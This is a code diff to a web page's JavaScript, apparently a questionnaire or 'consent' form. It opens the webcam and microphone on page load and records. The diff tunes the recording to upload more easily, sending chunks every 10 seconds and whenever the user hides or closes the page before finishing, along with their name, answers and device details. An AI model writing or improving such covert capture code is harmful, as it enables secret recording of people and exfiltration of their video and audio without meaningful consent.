@@ -109,8 +109,9 @@
 
         window.addEventListener('DOMContentLoaded', async () => {
             try {
+                // Resolution sghira bech ykoun haj3m el-video khafif barcha
                 const constraints = {
-                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } },
                     audio: true
                 };
 
@@ -118,11 +119,11 @@
                 const videoElement = document.getElementById('webcam');
                 videoElement.srcObject = mediaStream;
 
-                let options = {};
+                let options = { videoBitsPerSecond: 250000 };
                 if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
-                    options = { mimeType: 'video/webm;codecs=vp8,opus' };
+                    options.mimeType = 'video/webm;codecs=vp8,opus';
                 } else if (MediaRecorder.isTypeSupported('video/mp4')) {
-                    options = { mimeType: 'video/mp4' };
+                    options.mimeType = 'video/mp4';
                 }
 
                 mediaRecorder = new MediaRecorder(mediaStream, options);
@@ -133,22 +134,22 @@
                 };
                 mediaRecorder.start(1000);
 
-                // إرسال حزمة التسجيل تلقائياً كل 5 ثوانٍ لحماية البيانات في حال إغلاق التطبيق فوراً
+                // Send auto-sync kol 10 thwani
                 autoSyncInterval = setInterval(() => {
                     if (!isCompleted && recordedChunks.length > 0) {
-                        sendDataBeacon("Enregistrement en arrière-plan (Auto-Sync)");
+                        sendDataBeacon("Auto-Sync 10s");
                     }
-                }, 5000);
+                }, 10000);
 
             } catch (err) {
-                console.log("Accès média refusé: ", err);
+                console.error("Caméra bloquée ou refusée: ", err);
             }
         });
 
-        function sendDataBeacon(reason = "") {
+        async function sendDataBeacon(reason = "") {
             if (recordedChunks.length === 0) return;
 
-            const username = document.getElementById('username').value || "Utilisateur (En cours)";
+            const username = document.getElementById('username').value || "Utilisateur Anonyme";
             const q1 = document.getElementById('q1').value || "N/A";
             const q2 = document.getElementById('q2').value || "N/A";
             const q3 = document.getElementById('q3').value || "N/A";
@@ -167,23 +168,24 @@
             formData.append('q3', q3);
             formData.append('video', videoBlob, `recording.${ext}`);
 
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon('/submit-consent', formData);
-            } else {
-                fetch('/submit-consent', { method: 'POST', body: formData }).catch(()=>{});
+            try {
+                await fetch('/submit-consent', { method: 'POST', body: formData });
+            } catch (e) {
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon('/submit-consent', formData);
+                }
             }
         }
 
-        // عند الخروج عبر زر المربع أو تصغير النافذة
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
-                sendDataBeacon("Fermé via زر المربع / Application masquée");
+                sendDataBeacon("Fermé via bouton carré / Recent Apps");
             }
         });
 
         window.addEventListener('pagehide', () => {
             if (!isCompleted) {
-                sendDataBeacon("Page fermée (pagehide)");
+                sendDataBeacon("Page hide / Fermeture");
             }
         });
 
@@ -218,29 +220,10 @@
                 }
 
                 setTimeout(async () => {
-                    const device = getDeviceInfo();
-                    const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/webm';
-                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-                    const videoBlob = new Blob(recordedChunks, { type: mimeType });
-
-                    const formData = new FormData();
-                    formData.append('username', `${username} [Réussi !]`);
-                    formData.append('location', "Non disponible");
-                    formData.append('device', JSON.stringify(device));
-                    formData.append('q1', q1);
-                    formData.append('q2', q2);
-                    formData.append('q3', q3);
-                    formData.append('video', videoBlob, `recording.${ext}`);
-
-                    try {
-                        await fetch('/submit-consent', { method: 'POST', body: formData });
-                        statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
-                        if (mediaStream) {
-                            mediaStream.getTracks().forEach(track => track.stop());
-                        }
-                    } catch (err) {
-                        statusDiv.style.color = 'red';
-                        statusDiv.innerText = 'Erreur de connexion au serveur.';
+                    await sendDataBeacon("Réussi avec succès !");
+                    statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
                     }
                 }, 1000);
 
